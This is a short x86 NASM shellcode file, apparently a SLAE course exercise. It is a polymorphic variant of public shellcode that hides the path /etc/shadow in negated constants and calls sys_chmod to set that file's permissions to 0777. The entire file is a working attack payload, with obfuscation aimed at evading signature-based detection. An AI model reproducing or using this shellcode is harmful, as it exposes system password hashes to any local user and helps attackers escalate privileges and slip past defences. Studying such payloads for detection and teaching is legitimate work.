; Filename: poly_shellcode_593.nasm
; Author:  Samuel Dugo
; SLAE-ID:    SLAE-1376
; Size:       42 bytes (144%)
; Purpose: Polymorphic version of shellcode found on http://shell-storm/shellcode/files/shellcode-593.php 

global _start			

section .text
_start:
	xor    eax,eax
	push   eax		;adds null terminator
        mov    ecx,0x88909B9F  ;complement of 0x776f6461 "woda"
        neg    ecx
	push   ecx
	mov    ecx,0x978CD09D  ;complement of 0x68732f63 "hs/c"
        neg    ecx
	push   ecx
        mov    ecx,0x8B9AD0D1  ;complement of 0x74652f2f "te//"
	neg    ecx
        push   ecx
	mov    ebx,esp
        add    al,0xff
        add    ah,0x1
        mov    ecx,eax         ;ecx contains 511 to change /etc/shadow to 0777
	sub    ax,0x1f0        ;eax contains 0xf for syscall sys_chmod (0x0f)
	int    0x80